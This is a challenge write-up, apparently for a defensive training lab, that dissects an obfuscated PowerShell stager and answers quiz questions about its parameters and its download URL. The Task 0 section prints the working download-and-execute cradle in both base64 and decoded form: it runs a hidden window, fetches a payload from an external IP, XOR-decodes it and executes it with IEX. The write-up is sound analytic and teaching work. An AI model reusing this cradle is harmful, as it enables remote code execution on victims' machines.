<img src="Images/PowerShell_Script%20-%20Logo.png" width="240">

# Table of Contents

- [Introduction](#introduction)
    - [Scenario](#scenario)
    - [Artefacts](#artefacts)
- [Tasks](#tasks)
    - [Task 0](#task-0)
    - [Task 1](#task-1)
    - [Task 2](#task-2)
    - [Task 3](#task-3)
    - [Task 4](#task-4)
    - [Task 5](#task-5)
    - [Task 6](#task-6)
- [Indicators of Compromise](#indicators-of-compromise)
- [MITRE ATT&CK](#mitre-attck)
- [Remediation](#remediation)

---
# Introduction

## Scenario

> Sherlock Scenario You've come across a puzzling Base64 script, seemingly laced with malicious intent. Your mission, should you choose to accept it, is to dissect and analyze this script, unveiling its true nature and potential risks. Dive into the code and reveal its secrets to safeguard our digital realm. Good luck on this daring quest!
>
> Connect to the VM with the credential provided using RDP. From pwnbox use the command
```
> xfreerdp /v:<ipaddress> /u:letsdefend /p:'' /cert-ignore /dynamic-resolution
```
>
> Tool Needed: [Cyberchef](https://gchq.github.io/CyberChef/)
> File Location: `C:\Users\LetsDefend\Desktop\ChallengeFile\script.ps1`
> This challenge prepared by [ZaadoOfc](https://www.linkedin.com/in/zaid-shah-05527a22b/) Credit: csnp.org
>
> Username : `LetsDefend` - Password : `<blank>`

## Artefacts

We started the Sherlock by connecting to the VM over RDP. The challenge folder contained a file called `script.ps1`.

# Tasks

## Task 0

**What encoding is the malicious script using?**

First we connected to the VM

```
xfreerdp /v:10.129.246.18 /u:letsdefend /p:'' /cert-ignore /dynamic-resolution
```

![PowerShell_Script - Task 1 part1](Images/PowerShell_Script%20-%20Task%201%20part1.png)

Then we headed to the folder `ChallengeFile`, which contained the powershell script `script.ps1`

![PowerShell_Script - Task 1 part2](Images/PowerShell_Script%20-%20Task%201%20part2.png)

The script contained the following.

```
powershell.exe -NoP -sta -NonI -W Hidden -Enc
JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMAbABpAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAG8AeABZACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAFUARQBzAHQAXQA6ADoARABFAEYAQQB1AEwAdABXAGUAYgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBPAHgAWQAuAEMAcgBFAGQAZQBuAFQAaQBhAGwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQB0AFcATwByAEsAQwByAGUAZABFAE4AVABpAEEAbABzADsAJABLAD0AJwBJAE0ALQBTACYAZgBBADkAWAB1AHsAWwApAHwAdwBkAFcASgBoAEMAKwAhAE4AfgB2AHEAXwAxADIATAB0AHkAJwA7ACQAaQA9ADAAOwBbAEMASABhAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AE4ATABPAGEARABTAHQAcgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwA5ADgALgAxADAAMwAuADEAMAAzAC4AMQA3ADAAOgA3ADQANAAzAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgAbwBSACQASwBbACQASQArACsAJQAkAGsALgBMAEUAbgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA=
```

From the scenario, and by its looks, we knew it was `base64` encoded. We could confirm that with Cyberchef.

![PowerShell_Script - Task 1 part3](Images/PowerShell_Script%20-%20Task%201%20part3.png)

Since Powershell uses a specific encoding for `-Enc`, we had to convert the decoded `base64` to `UTF-16LE`, which revealed the content of the script :

```
$WC=New-ObjEcT SySTeM.NET.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADeRS.ADd('User-Agent',$u);$Wc.ProxY = [System.NeT.WEBReQUEst]::DEFAuLtWebProXy;$wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls;$K='IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty';$i=0;[CHaR[]]$B=([cHaR[]]($wc.DOwNLOaDStriNg("http://98.103.103.170:7443/index.asp")))|%{$_-BXoR$K[$I++%$k.LEnGTH]};IEX ($B-jOIn'')
```

**ANSWER:** `base64`

## Task 1

**What parameter in the powershell script makes it so that the powershell window is hidden when executed?**

The parameter `-W Hidden` (short for `-WindowStyle Hidden`) was used to make the script hidden when executed.

**ANSWER:** `-W Hidden`

## Task 2

**What parameter in the Powershell script prevents the user from closing the process?**

The parameter `-NonI` (short for `-NonInteractive`) was used. It starts PowerShell without an interactive prompt, so the user has no console to interact with or close, which is the behaviour the challenge describes.

**ANSWER:** `-NonI`

## Task 3

**What line of code allows the script to interact with websites and retrieve information from them?**

The decoded base64 revealed this information. The attacker assigned a `System.Net.WebClient` object to the variable `$WC` in order for the script to interact with websites.

**ANSWER:** `$WC=New-ObjEcT SySTeM.NET.WebCliENt`

## Task 4

**What is the user agent string that is being spoofed in the malicious script?**

The user agent spoofed by the attacker was `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`.

**ANSWER:** `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`

## Task 5

**What line of code is used to set the proxy credentials for authentication in the script?**

The credentials were passed through the variable `$wc.PROxY.CrEdenTialS`.

**ANSWER:** `$wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls`

## Task 6

**When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?**

The URL contacted by the script to download the malicious payload was `http://98.103.103.170:7443/index.asp`.

**ANSWER:** `http://98.103.103.170:7443/index.asp`

# Indicators of Compromise

|Type|Value|Context|
|---|---|---|
|URL|`http://98.103.103.170:7443/index.asp`|Payload download location|
|IP address|`98.103.103.170`|Attacker server|
|Port|`7443/tcp`|Non-standard HTTP port|
|User-Agent|`Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`|Spoofed IE11 user agent|
|Command line|`powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64>`|Launch pattern of the script|
|XOR key|`IM-S&fA9Xu{[)\|wdWJhC+!N~vq_12Lty`|Key used to decode the downloaded payload|

# MITRE ATT&CK

|Tactic|Technique|ID|Evidence|
|---|---|---|---|
|Execution|Command and Scripting Interpreter: PowerShell|T1059.001|`powershell.exe -NoP -sta -NonI -W Hidden -Enc`|
|Defense Evasion|Obfuscated Files or Information|T1027|Base64 / UTF-16LE encoded command, randomized casing|
|Defense Evasion|Deobfuscate/Decode Files or Information|T1140|Downloaded payload decoded with an XOR key before `IEX`|
|Defense Evasion|Hide Artifacts: Hidden Window|T1564.003|`-W Hidden`|
|Command and Control|Ingress Tool Transfer|T1105|`DownloadString("http://98.103.103.170:7443/index.asp")`|
|Command and Control|Application Layer Protocol: Web Protocols|T1071.001|HTTP request with a spoofed IE11 user agent|
|Command and Control|Non-Standard Port|T1571|Port `7443`|

# Remediation

|Action|Detail|
|---|---|
|Block the infrastructure|Block `98.103.103.170` and the URL `http://98.103.103.170:7443/index.asp` at the proxy and the firewall|
|Hunt|Search proxy, firewall and EDR logs for other hosts that contacted this IP, and for the command line pattern listed in the IOCs|
|Isolate|Isolate any host that ran the script and treat it as compromised : the second stage was never retrieved, so what `index.asp` delivers is unknown|
|Reset credentials|Reset the credentials of the user who ran the script. It authenticated to the proxy with the default network credentials of the logged-in session|
|Improve logging|Enable PowerShell Script Block Logging and module logging, and forward them to the SIEM|
|Harden|Restrict outbound web access for non-browser processes and enforce PowerShell Constrained Language Mode where possible|

![PowerShell_Script - Solved](Images/PowerShell_Script%20-%20Solved.png)
